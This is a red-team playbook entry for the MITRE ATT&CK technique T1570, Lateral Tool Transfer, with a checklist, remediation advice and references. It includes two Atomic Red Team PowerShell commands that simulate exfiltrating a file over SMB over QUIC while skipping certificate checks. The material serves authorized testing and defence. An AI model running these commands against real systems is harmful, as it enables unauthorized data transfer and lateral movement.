---
name: "T1570_lateral-tool-transfer"
description: "Adversaries may transfer tools or other files between systems in a compromised environment."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1570
  - lateral-movement
  - esxi
  - linux
  - macos
  - windows
technique_id: "T1570"
tactic: "lateral-movement"
all_tactics:
  - lateral-movement
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1570"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-284
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1570 Lateral Tool Transfer

## High-Level Description

Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.

Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.

Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.

## Kill Chain Phase

- Lateral Movement (TA0008)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Lateral Tool Transfer technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Lateral Tool Transfer
- [ ] Check Linux systems for indicators of Lateral Tool Transfer
- [ ] Check macOS systems for indicators of Lateral Tool Transfer
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltration Over SMB over QUIC (New-SmbMapping)

Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
copy '#{local_file}' 'Z:\'
```

### Atomic Test 2: Exfiltration Over SMB over QUIC (NET USE)

Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
copy '#{local_file}' '*:\'
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Lateral Tool Transfer by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1570 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1037 Filter Network Traffic
Consider using the host firewall to restrict file sharing communications such as SMB.

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions.


## Detection

### Detection Strategy for Lateral Tool Transfer across OS platforms


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Lateral Tool Transfer technique applicable | Low | Lateral Movement |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-284 | Improper Access Control |


## References

- [Dropbox Malware Sync](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)
- [Unit42 LockerGoga 2019](https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/)
- [Atomic Red Team - T1570](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1570)
- [MITRE ATT&CK - T1570](https://attack.mitre.org/techniques/T1570)
